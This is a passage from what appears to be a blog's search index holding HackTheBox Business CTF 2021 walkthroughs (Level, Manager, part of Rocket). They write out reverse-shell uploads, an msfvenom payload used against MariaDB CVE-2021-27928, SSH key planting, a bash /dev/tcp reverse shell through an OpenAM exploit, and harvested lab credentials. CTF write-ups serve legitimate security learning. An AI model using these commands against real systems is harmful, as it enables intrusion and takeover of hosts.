2020-09-24       excellent  Yes    HorizontCMS Arbitrary PHP File Upload   Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/horizontcms_upload_exec  Unfortunately, our metasploit couldn’t make a shell from exploit,  [SNIP] msf6 exploit(multi/http/horizontcms_upload_exec) &gt; run  [*] Started reverse TCP handler on 10.10.14.172:4445  [!] AutoCheck is disabled, proceeding with exploitation [-] Exploit aborted due to failure: unknown: Failed to obtain the csrf token required for authentication. [-] Failed to delete the payload. [!] Manual cleanup of  is required. [*] Exploit completed, but no session was created. msf6 exploit(multi/http/horizontcms_upload_exec) &gt;  so we manualy to upload our exploit to HorizontCMS.     Login to http://10.129.85.134/admin/ as admin:N&gt;2sM4^R_j&gt;g)cfe   Navigate to Media &gt; Files, upload our reverse shell from /usr/share/webshells/php/php-reverse-shell.php, we need add our ip address, and port listener is 4444   We need rename our php reverse shell (in this case renamed to rev.php). Now we have our php reverse shell    Let’s run our php reverse shell http://10.129.85.134/storage/rev.php and prepare netcat listener nc -lvnp 4444     $ nc -lvnp 4444 Ncat: Version 7.91 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.129.85.134. Ncat: Connection from 10.129.85.134:48762. Linux level 5.4.0-48-generic #52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux  15:47:41 up  2:06,  0 users,  load average: 0.08, 0.02, 0.01 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT uid=1000(albert) gid=1000(albert) groups=1000(albert) /bin/sh: 0: can't access tty; job control turned off $ whoami albert $ cd /home/albert $ ls -la total 28 drwxr-xr-x 3 albert albert 4096 Jun 24 05:18 . drwxr-xr-x 3 root   root   4096 Jun 16 10:05 .. lrwxrwxrwx 1 albert albert    9 Jun 16 08:41 .bash_history -&gt; /dev/null -rw-r--r-- 1 albert albert  220 Jun 16 08:41 .bash_logout -rw-r--r-- 1 albert albert 3797 Jun 16 08:41 .bashrc -rw-r--r-- 1 albert albert  807 Jun 16 08:41 .profile drwx------ 2 albert albert 4096 Jun 16 09:58 .ssh -r-------- 1 albert albert   29 Jun 24 05:18 user.txt $ cat user.txt HTB{0utd4t3d_cms_1s_n0_g00d} $           Privilege Escalation  Go back to .env. Now we need login as database.  DB_HOST=127.0.0.1 DB_CONNECTION=mysql DB_USERNAME=hcms DB_PASSWORD=N&gt;2sM4^R_j&gt;g)cfe DB_DATABASE=hcms HCMS_ADMIN_PREFIX=admin  Login to database  albert@level:/home/albert$ mysql -u hcms -h 127.0.0.1 hcms -p mysql -u hcms -h 127.0.0.1 hcms -p Enter password: N&gt;2sM4^R_j&gt;g)cfe  Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A  Welcome to the MariaDB monitor.  Commands end with ; or \\g. Your MariaDB connection id is 182 Server version: 10.5.8-MariaDB MariaDB Server  Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.  Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.  MariaDB [hcms]&gt;   Database engine 10.5.8-MariaDB MariaDB Server, we follow tutorial from MariaDB 10.2 Command Execution   Proof of Concept:     Create the reverse shell payload msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.172 LPORT=4445 -f elf-so -o CVE-2021-27928.so   $ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.172 LPORT=4445 -f elf-so -o CVE-2021-27928.so [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 74 bytes Final size of elf-so file: 476 bytes Saved as: CVE-2021-27928.so     In our kali linux machine. Let’s create a ssh key and upload to target machine   $ ssh-keygen                                                                                              130 ⨯ Generating public/private rsa key pair. Enter file in which to save the key (/twseptian/.ssh/id_rsa): /twseptian/lab/hackthebox/ctf-business-2021/level/ssh/id_rsa Enter passphrase (empty for no passphrase):  Enter same passphrase again:  Your identification has been saved in /twseptian/lab/hackthebox/ctf-business-2021/level/ssh/id_rsa Your public key has been saved in /twseptian/lab/hackthebox/ctf-business-2021/level/ssh/id_rsa.pub The key fingerprint is: SHA256:+MYaM2Y+........[SNIP] twseptian@kali The key's randomart image is: +---[RSA 3072]----+ |     .+=+=Eo     | |     .. = o      | |      +B .       | |     .o== .      | |    o +*S.       | |   . oo=+o .     | |     .Bo=o+      | |    .++O=.       | |     o=B+        | +----[SHA256]-----+  copy our id_rsa.pub to target machine   albert@level:/home/albert/.ssh$ echo 'ssh-rsa AAAAB3...........[SNIP] twseptian@kali' &gt;&gt; authorized_keys  Now we can remote target machine using our id_rsa   $ ssh -i id_rsa albert@10.129.85.134         Enter passphrase for key 'id_rsa':  Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-48-generic x86_64)   * Documentation:  https://help.ubuntu.com  * Management:     https://landscape.canonical.com  * Support:        https://ubuntu.com/advantage    System information as of Mon 26 Jul 2021 05:06:46 PM UTC    System load:  0.01              Processes:             181   Usage of /:   66.9% of 9.51GB   Users logged in:       0   Memory usage: 29%               IPv4 address for eth0: 10.129.85.134   Swap usage:   0%   * Super-optimized for small spaces - read how we shrank the memory    footprint of MicroK8s to make it the smallest full K8s around.     https://ubuntu.com/blog/microk8s-memory-optimisation  155 updates can be installed immediately. 73 of these updates are security updates. To see these additional updates run: apt list --upgradable   The list of available updates is more than a week old. To check for new updates run: sudo apt update   The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright.  Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law.  albert@level:~$      In our kali machine copy the payload to the target machine (In this example, SCP/SSH is used) scp -i ssh/id_rsa CVE-2021-27928.so albert@10.129.85.134:/tmp/CVE-2021-27928.so   $ scp -i ssh/id_rsa CVE-2021-27928.so albert@10.129.85.134:/tmp/CVE-2021-27928.so                           1 ⨯ Enter passphrase for key 'ssh/id_rsa':  CVE-2021-27928.so                                                               100%  476     1.1KB/s   00:00        Execute the payload mysql -u hcms -p -e 'SET GLOBAL wsrep_provider=\"/tmp/CVE-2021-27928.so\";'   albert@level:/tmp$ mysql -u hcms -p -e 'SET GLOBAL wsrep_provider=\"/tmp/CVE-2021-27928.so\";' Enter password:  ERROR 2013 (HY000) at line 1: Lost connection to MySQL server during query albert@level:/tmp$         start a netcat listener nc -lvnp 4445   ","categories": ["HackTheBox","HackTheBox Business CTF 2021","CTF"],
        "tags": ["HackTheBox Business CTF 2021","CVE-2020-17519","CVE-2020-27387"],
        "url": "http://localhost:4000/hackthebox/hackthebox%20business%20ctf%202021/ctf/htbbiz2021-level/",
        "teaser": "http://localhost:4000/assets/images/htb-frame.png"
      },{
        "title": "HackTheBox Business CTF 2021 - Manager (Fullpwn)",
        "excerpt":"Manager is a fullpwn machine from HackTheBox Business CTF 2021. Our team has solved this machine in the first round. The vulnerability is ForgeRock Access Manager/OpenAM 14.6.3 - Remote Code Execution (RCE) (Unauthenticated) or CVE-2021-35464. To get PrivEsc, we need login as root using tomcat credential.   Network Scanning  First we need to know about all open ports, service version, hostname on the target.  # Nmap 7.91 scan initiated Fri Jul 23 19:09:30 2021 as: nmap -sC -sV -T4 -A -p- --vv -oN nmap/nmap_manager 10.129.171.179 Increasing send delay for 10.129.171.179 from 0 to 5 due to 1227 out of 3067 dropped probes since last increase. Nmap scan report for 10.129.171.179 Host is up, received reset ttl 63 (0.24s latency). Scanned at 2021-07-23 19:09:31 WIB for 1210s Not shown: 65529 closed ports Reason: 65529 resets PORT      STATE SERVICE     REASON         VERSION 22/tcp    open  ssh         syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) 1689/tcp  open  java-rmi    syn-ack ttl 63 Java RMI 4444/tcp  open  ssl/krb524? syn-ack ttl 63 8080/tcp  open  http        syn-ack ttl 63 Apache Tomcat 9.0.48 39849/tcp open  java-rmi    syn-ack ttl 63 Java RMI 50389/tcp open  unknown     syn-ack ttl 63 | fingerprint-strings:  |   DNSStatusRequestTCP:  |     Cannot decode the provided ASN.1 integer element because the length of the element value was not between one and four bytes (actual length was 0) |     1.3.6.1.4.1.1466.20036 |   DNSVersionBindReqTCP:  |     ?Cannot decode the provided ASN.1 sequence as an LDAP message because the second element of the sequence could not be decoded as the protocol op: org.opends.server.types.LDAPException: Cannot decode the provided ASN.1 element as an LDAP protocol op because the element had an invalid BER type (0) for an LDAP protocol op |     1.3.6.1.4.1.1466.20036 |   RPCCheck:  |     qCannot decode the ASN.1 element because an unexpected end of file was reached while reading the first length byte |_    1.3.6.1.4.1.1466.20036 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port50389-TCP:V=7.91%I=7%D=7/23%Time=60FAB5DC%P=x86_64-pc-linux-gnu%r(R SF:PCCheck,99,\"0\\x81\\x96\\x02\\x01\\0x\\x81\\x90\\n\\x01\\x02\\x04\\0\\x04qCannot\\x20 SF:decode\\x20the\\x20ASN\\.1\\x20element\\x20because\\x20an\\x20unexpected\\x20en SF:d\\x20of\\x20file\\x20was\\x20reached\\x20while\\x20reading\\x20the\\x20first\\x SF:20length\\x20byte\\x8a\\x161\\.3\\.6\\.1\\.4\\.1\\.1466\\.20036\")%r(DNSVersionBin SF:dReqTCP,16B,\"0\\x82\\x01g\\x02\\x01\\0x\\x82\\x01`\\n\\x01\\x02\\x04\\0\\x04\\x82\\x01 SF:\\?Cannot\\x20decode\\x20the\\x20provided\\x20ASN\\.1\\x20sequence\\x20as\\x20an SF:\\x20LDAP\\x20message\\x20because\\x20the\\x20second\\x20element\\x20of\\x20the SF:\\x20sequence\\x20could\\x20not\\x20be\\x20decoded\\x20as\\x20the\\x20protocol\\ SF:x20op:\\x20org\\.opends\\.server\\.types\\.LDAPException:\\x20Cannot\\x20decod SF:e\\x20the\\x20provided\\x20ASN\\.1\\x20element\\x20as\\x20an\\x20LDAP\\x20protoc SF:ol\\x20op\\x20because\\x20the\\x20element\\x20had\\x20an\\x20invalid\\x20BER\\x2 SF:0type\\x20\\(0\\)\\x20for\\x20an\\x20LDAP\\x20protocol\\x20op\\x8a\\x161\\.3\\.6\\.1 SF:\\.4\\.1\\.1466\\.20036\")%r(DNSStatusRequestTCP,BA,\"0\\x81\\xb7\\x02\\x01\\0x\\x8 SF:1\\xb1\\n\\x01\\x02\\x04\\0\\x04\\x81\\x91Cannot\\x20decode\\x20the\\x20provided\\x2 SF:0ASN\\.1\\x20integer\\x20element\\x20because\\x20the\\x20length\\x20of\\x20the\\ SF:x20element\\x20value\\x20was\\x20not\\x20between\\x20one\\x20and\\x20four\\x20b SF:ytes\\x20\\(actual\\x20length\\x20was\\x200\\)\\x8a\\x161\\.3\\.6\\.1\\.4\\.1\\.1466\\ SF:.20036\"); Device type: firewall Running (JUST GUESSING): Fortinet embedded (87%) OS CPE: cpe:/h:fortinet:fortigate_100d OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU Aggressive OS guesses: Fortinet FortiGate 100D firewall (87%) No exact OS matches for host (test conditions non-ideal). TCP/IP fingerprint: SCAN(V=7.91%E=4%D=7/23%OT=22%CT=1%CU=%PV=Y%G=N%TM=60FAB635%P=x86_64-pc-linux-gnu) ECN(R=N) T1(R=N) T2(R=N) T3(R=N) T4(R=N) T5(R=N) T6(R=N) T7(R=N) U1(R=N) IE(R=N)  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  TRACEROUTE (using port 80/tcp) HOP RTT       ADDRESS 1   271.70 ms 10.10.14.1 2   ... 30  Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Jul 23 19:29:41 2021 -- 1 IP address (1 host up) scanned in 1211.21 seconds  Before we enumerate target machine, we add manager.htb to /etc/hosts in our kali linux machine.  Enumeration  After we have results from nmap, we need to enumerate all open ports. In this case we found some ports such as:     Port 22 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0);   Port 1689,39849 Java RMI;   Port 8080 Apache Tomcat 9.0.48;   Port 5038963 LDAP;   and the operating system is Ubuntu Linux   Port 8080   Go to web browser and access the manager.htb:8080. Port 8080 is OpenAM - Community Edition service.    Let’s find the vulnerability using searchploit  $ searchsploit OpenAM -------------------------------------------------------------------------------- ---------------------------------  Exploit Title                                                                  |  Path -------------------------------------------------------------------------------- --------------------------------- ForgeRock Access Manager/OpenAM 14.6.3 - Remote Code Execution (RCE) (Unauthent | java/webapps/50131.py -------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results  The vulnerability is ForgeRock Access Manager/OpenAM 14.6.3 - Remote Code Execution (RCE) (Unauthenticated) or https://www.exploit-db.com/exploits/50131 from exploit.db      Copy the python exploit to our directory  $ searchploit -m java/webapps/50131.py   Gaining Access  We can run exploit to get information about /etc/passwd using command python3 50131.py -c 'cat /etc/passwd' http://manager.htb:8080/openam.  $ python3 50131.py -c 'cat /etc/passwd' http://manager.htb:8080/openam [!] Verifying reachability of http://manager.htb:8080/openam/ [+] Endpoint http://manager.htb:8080/openam/ reachable [!] Finding correct OpenAM endpoint [+] Found potential vulnerable endpoint: http://manager.htb:8080/openam/oauth2/..;/ccversion/Version [+] !SUCCESS! Host http://manager.htb:8080/openam/ is vulnerable to CVE-2021-35464 [+] Running command \"cat /etc/passwd\" now:  root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false tomcat:x:1001:1001::/opt/tomcat:/bin/false  Next,how we get the target shell?,so we can using this command python3 50131.py -c \"/usr/bin/bash -c '/usr/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.49/4444 0&gt;&amp;1'\", and prepare netcat listener nc -lvnp 4444 on our kali linux machine.  $ python3 50131.py -c \"/usr/bin/bash -c '/usr/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.49/4444 0&gt;&amp;1'\" http://manager.htb:8080/openam [!] Verifying reachability of http://manager.htb:8080/openam/ [+] Endpoint http://manager.htb:8080/openam/ reachable [!] Finding correct OpenAM endpoint [+] Found potential vulnerable endpoint: http://manager.htb:8080/openam/oauth2/..;/ccversion/Version [+] !SUCCESS! Host http://manager.htb:8080/openam/ is vulnerable to CVE-2021-35464 [+] Running command \"/usr/bin/bash -c '/usr/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.49/4444 0&gt;&amp;1'\" now:  netcat listener nc -lvnp 4444  $ nc -lvnp 4444 Ncat: Version 7.91 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.129.171.179. Ncat: Connection from 10.129.171.179:46620. bash: cannot set terminal process group (831): Inappropriate ioctl for device bash: no job control in this shell tomcat@manager:/$  Next we need enumerate tomcat directory  tomcat@manager:~$ ls -la ls -la total 68 drwxr-xr-x 13 tomcat tomcat 4096 Jul  2 18:01 . drwxr-xr-x  3 root   root   4096 Jul  1 12:11 .. lrwxrwxrwx  1 root   root      9 Jul  2 11:26 .bash_history -&gt; /dev/null -rw-r--r--  1 tomcat tomcat  220 Feb 25  2020 .bash_logout -rw-r--r--  1 tomcat tomcat 3771 Feb 25  2020 .bashrc drwxr-x---  2 tomcat tomcat 4096 Jul  2 17:19 .openamcfg -rw-r--r--  1 tomcat tomcat  807 Feb 25  2020 .profile drwxr-xr-x  4 root   root   4096 Jul  2 17:13 accessmanager drwxr-xr-x  2 tomcat tomcat 4096 Jun 10 11:22 bin drwxr-xr-x  3 tomcat tomcat 4096 Jul  2 17:40 conf drwxr-x---  2 tomcat tomcat 4096 Jul  1 14:33 config drwxr-xr-x  2 tomcat tomcat 4096 Jun 10 11:22 lib drwxr-xr-x  2 tomcat tomcat 4096 Jul 23 12:02 logs drwxr-x---  7 tomcat tomcat 4096 Jul  2 17:19 openam drwxr-xr-x  2 tomcat tomcat 4096 Jul 23 12:02 temp -r--------  1 tomcat tomcat   52 Jul  2 18:01 user.txt drwxr-xr-x  5 tomcat tomcat 4096 Jul  2 17:53 webapps drwxr-xr-x  3 tomcat tomcat 4096 Jul  1 12:23 work  user.txt flag  tomcat@manager:~$ cat user.txt cat user.txt HTB{1n53cur3_d353r14l1z4710n_c4n_b3_v3ry_d4n63r0u5} tomcat@manager:~$   Privilege Escalation  Let’s find tomcat credential on /opt/tomcat/conf/tomcat-users.xml  tomcat@manager:~/conf$ cat tomcat-users.xml | grep password cat tomcat-users.xml | grep password   you must define such a user - the username and password are arbitrary.   will also need to set the passwords to something appropriate.   &lt;user username=\"admin\" password=\"BXJ^JA3y4!nE8x9q\" roles=\"admin-gui\"/&gt;   them. You will also need to set the passwords to something appropriate.   &lt;user username=\"tomcat\" password=\"&lt;must-be-changed&gt;\" roles=\"tomcat\"/&gt;   &lt;user username=\"both\" password=\"&lt;must-be-changed&gt;\" roles=\"tomcat,role1\"/&gt;   &lt;user username=\"role1\" password=\"&lt;must-be-changed&gt;\" roles=\"role1\"/&gt;  Now, we have tomcat creds admin:BXJ^JA3y4!nE8x9q. Let’s login as root using tomcat’s password.   ","categories": ["HackTheBox","HackTheBox Business CTF 2021","CTF"],
        "tags": ["HackTheBox Business CTF 2021","OpenAM Community Edition","CVE-2021-35464"],
        "url": "http://localhost:4000/hackthebox/hackthebox%20business%20ctf%202021/ctf/htbbiz2021-manager/",
        "teaser": "http://localhost:4000/assets/images/htb-frame.png"
      },{
        "title": "HackTheBox Business CTF 2021 - Rocket (Fullpwn)",
        "excerpt":"Rocket is a fullpwn type challenge from HackTheBox Business CTF 2021. The vulnerability on the machine is about Rocket.Chat 3.12.1 - NoSQL Injection to RCE (Unauthenticated) - CVE-2021-22911. For Privilege Escalation is CVE-2021-3156: Heap-Based Buffer Overflow in Sudo (Baron Samedit)   Network Scanning  Let’s find all open ports on the target machine using nmap  # Nmap 7.91 scan initiated Mon Jul 26 13:02:38 2021 as: nmap -sC -sV -T4 -A -p- --vv -oN nmap/nmap_rocket_all_ports rocket.htb Nmap scan report for rocket.htb (10.129.1.7) Host is up, received reset ttl 63 (0.21s latency). Scanned at 2021-07-26 13:02:38 WIB for 796s Not shown: 65532 closed ports Reason: 65532 resets PORT     STATE SERVICE REASON         VERSION 22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey:  |   3072 d9:10:6a:46:42:2b:1a:70:54:2b:c3:d8:d3:da:07:6f (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCygrXYNGVAmclf2y7z2/Qxm3vpojFDsnQW8/kPFoFx3IlzEg66Vq+nS5vEUy0JFMGgfopUcd5zUVUGwOM0WUMCap+A0nKd68W/vTIQ5Qjyui/YHmsAJ7TBgWNO4WKrJb7DHp4FXS6/0jv9YbXCvbRKM0Wtr78eKyTMWFAH2anO2dURVcsWy/emdfPx+rtAHd1J2dQKkzQ0qpyktpfCHPUAJHy4eYRmpyTNDklhE0j3gzaOc9vO/uSIYxWGfxT6HK67YuvzB/dVv3c0PUDOQeFNcGXbmN0NWv4S2SS/tZJq6VQoa7blNQgtLhmB/Fb8STZALxkJ2ohhsp+DDs5gv2fV5AthOeKZcOUlDdzLNcQAaLngLTelUTOZ1XFECjWrEbBCHbqUXatL+cNEAo6UUXN1OoXYCs95hw6+ZgEZMpwZ5MqvKwVmR0DWbCaH/CPMfrqScpzgr9Hde8gDNS2cvirGaiM5t6M/+Ar7I3v1Q//XSrP2p7taxRIEah6H2jIcUE= |   256 3c:b5:2b:6a:26:18:83:c3:3c:d9:77:34:58:13:5b:18 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBG6v28IjKN3c3mRkJmvhlOnl+UIwV1T0lul7Qnat4zwkwCCrO9693fFf3R8msYjTxCT+5D5+zcIolfOvXzsPZAY= |   256 91:34:8c:82:e0:8b:e3:d1:82:cb:6b:80:e0:99:e8:6a (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHvYOqFs6OTsIn0MXAR5KPNM8Ui3a4Va9l0ewvdZVoPI 80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu)) |_http-favicon: Unknown favicon MD5: 401666794A5E164A76E8BA21359B3477 | http-methods:  |_  Supported Methods: POST OPTIONS HEAD GET |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title:  Rocket Hosting  3000/tcp open  ppp?    syn-ack ttl 63 | fingerprint-strings:  |   GetRequest:  |     HTTP/1.1 200 OK |     X-XSS-Protection: 1 |     X-Content-Type-Options: nosniff |     X-Frame-Options: sameorigin |     X-Instance-ID: kDWTWMAjWrcYBeb8H |     Content-Type: text/html; charset=utf-8 |     Vary: Accept-Encoding |     Date: Mon, 26 Jul 2021 06:21:38 GMT |     Connection: close |     &lt;!DOCTYPE html&gt; |     &lt;html&gt; |     &lt;head&gt; |     &lt;link rel=\"stylesheet\" type=\"text/css\" class=\"__meteor-css__\" href=\"/789f2fee702e2a6a62ec245003ce4734eeec6f9a.css?meteor_css_resource=true\"&gt; |     &lt;meta charset=\"utf-8\" /&gt; |     &lt;meta http-equiv=\"content-type\" content=\"text/html; charset=utf-8\" /&gt; |     &lt;meta http-equiv=\"expires\" content=\"-1\" /&gt; |     &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" /&gt; |     &lt;meta name=\"fragment\" content=\"!\" /&gt; |     &lt;meta name=\"distribution\" content=\"global\" /&gt; |     &lt;meta name=\"rating\" content=\"general\" /&gt; |     &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no\" /&gt; |     &lt;meta name=\"mobile-web-app-capable\" cont |   HTTPOptions:  |     HTTP/1.1 200 OK |     X-XSS-Protection: 1 |     X-Content-Type-Options: nosniff |     X-Frame-Options: sameorigin |     X-Instance-ID: kDWTWMAjWrcYBeb8H |     Content-Type: text/html; charset=utf-8 |     Vary: Accept-Encoding |     Date: Mon, 26 Jul 2021 06:21:40 GMT |     Connection: close |     &lt;!DOCTYPE html&gt; |     &lt;html&gt; |     &lt;head&gt; |     &lt;link rel=\"stylesheet\" type=\"text/css\" class=\"__meteor-css__\" href=\"/789f2fee702e2a6a62ec245003ce4734eeec6f9a.css?meteor_css_resource=true\"&gt; |     &lt;meta charset=\"utf-8\" /&gt; |     &lt;meta http-equiv=\"content-type\" content=\"text/html; charset=utf-8\" /&gt; |     &lt;meta http-equiv=\"expires\" content=\"-1\" /&gt; |     &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" /&gt; |     &lt;meta name=\"fragment\" content=\"!\" /&gt; |     &lt;meta name=\"distribution\" content=\"global\" /&gt; |     &lt;meta name=\"rating\" content=\"general\" /&gt; |     &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no\" /&gt; |_    &lt;meta name=\"mobile-web-app-capable\" cont 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port3000-TCP:V=7.91%I=7%D=7/26%Time=60FE52F2%P=x86_64-pc-linux-gnu%r(Ge SF:tRequest,348A,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nX-XSS-Protection:\\x201\\r\\nX-Co SF:ntent-Type-Options:\\x20nosniff\\r\\nX-Frame-Options:\\x20sameorigin\\r\\nX-I SF:nstance-ID:\\x20kDWTWMAjWrcYBeb8H\\r\\nContent-Type:\\x20text/html;\\x20char SF:set=utf-8\\r\\nVary:\\x20Accept-Encoding\\r\\nDate:\\x20Mon,\\x2026\\x20Jul\\x20 SF:2021\\x2006:21:38\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n&lt;!DOCTYPE\\x20htm SF:l&gt;\\n&lt;html&gt;\\n&lt;head&gt;\\n\\x20\\x20&lt;link\\x20rel=\\\"stylesheet\\\"\\x20type=\\\"text/ SF:css\\\"\\x20class=\\\"__meteor-css__\\\"\\x20href=\\\"/789f2fee702e2a6a62ec245003 SF:ce4734eeec6f9a\\.css\\?meteor_css_resource=true\\\"&gt;\\n&lt;meta\\x20charset=\\\"ut SF:f-8\\\"\\x20/&gt;\\n\\t&lt;meta\\x20http-equiv=\\\"content-type\\\"\\x20content=\\\"text/h SF:tml;\\x20charset=utf-8\\\"\\x20/&gt;\\n\\t&lt;meta\\x20http-equiv=\\\"expires\\\"\\x20con SF:tent=\\\"-1\\\"\\x20/&gt;\\n\\t&lt;meta\\x20http-equiv=\\\"X-UA-Compatible\\\"\\x20content SF:=\\\"IE=edge\\\"\\x20/&gt;\\n\\t&lt;meta\\x20name=\\\"fragment\\\"\\x20content=\\\"!\\\"\\x20/&gt; SF:\\n\\t&lt;meta\\x20name=\\\"distribution\\\"\\x20content=\\\"global\\\"\\x20/&gt;\\n\\t&lt;meta SF:\\x20name=\\\"rating\\\"\\x20content=\\\"general\\\"\\x20/&gt;\\n\\t&lt;meta\\x20name=\\\"vie SF:wport\\\"\\x20content=\\\"width=device-width,\\x20initial-scale=1,\\x20maximum SF:-scale=1,\\x20user-scalable=no\\\"\\x20/&gt;\\n\\t&lt;meta\\x20name=\\\"mobile-web-app SF:-capable\\\"\\x20cont\")%r(HTTPOptions,348A,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nX-XS SF:S-Protection:\\x201\\r\\nX-Content-Type-Options:\\x20nosniff\\r\\nX-Frame-Opt SF:ions:\\x20sameorigin\\r\\nX-Instance-ID:\\x20kDWTWMAjWrcYBeb8H\\r\\nContent-T SF:ype:\\x20text/html;\\x20charset=utf-8\\r\\nVary:\\x20Accept-Encoding\\r\\nDate SF::\\x20Mon,\\x2026\\x20Jul\\x202021\\x2006:21:40\\x20GMT\\r\\nConnection:\\x20clo SF:se\\r\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html&gt;\\n&lt;head&gt;\\n\\x20\\x20&lt;link\\x20rel=\\\"st SF:ylesheet\\\"\\x20type=\\\"text/css\\\"\\x20class=\\\"__meteor-css__\\\"\\x20href=\\\"/ SF:789f2fee702e2a6a62ec245003ce4734eeec6f9a\\.css\\?meteor_css_resource=true SF:\\\"&gt;\\n&lt;meta\\x20charset=\\\"utf-8\\\"\\x20/&gt;\\n\\t&lt;meta\\x20http-equiv=\\\"content- SF:type\\\"\\x20content=\\\"text/html;\\x20charset=utf-8\\\"\\x20/&gt;\\n\\t&lt;meta\\x20htt SF:p-equiv=\\\"expires\\\"\\x20content=\\\"-1\\\"\\x20/&gt;\\n\\t&lt;meta\\x20http-equiv=\\\"X- SF:UA-Compatible\\\"\\x20content=\\\"IE=edge\\\"\\x20/&gt;\\n\\t&lt;meta\\x20name=\\\"fragmen SF:t\\\"\\x20content=\\\"!\\\"\\x20/&gt;\\n\\t&lt;meta\\x20name=\\\"distribution\\\"\\x20content SF:=\\\"global\\\"\\x20/&gt;\\n\\t&lt;meta\\x20name=\\\"rating\\\"\\x20content=\\\"general\\\"\\x2 SF:0/&gt;\\n\\t&lt;meta\\x20name=\\\"viewport\\\"\\x20content=\\\"width=device-width,\\x20i SF:nitial-scale=1,\\x20maximum-scale=1,\\x20user-scalable=no\\\"\\x20/&gt;\\n\\t&lt;met SF:a\\x20name=\\\"mobile-web-app-capable\\\"\\x20cont\"); No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=7/26%OT=22%CT=1%CU=35481%PV=Y%DS=2%DC=T%G=Y%TM=60FE531 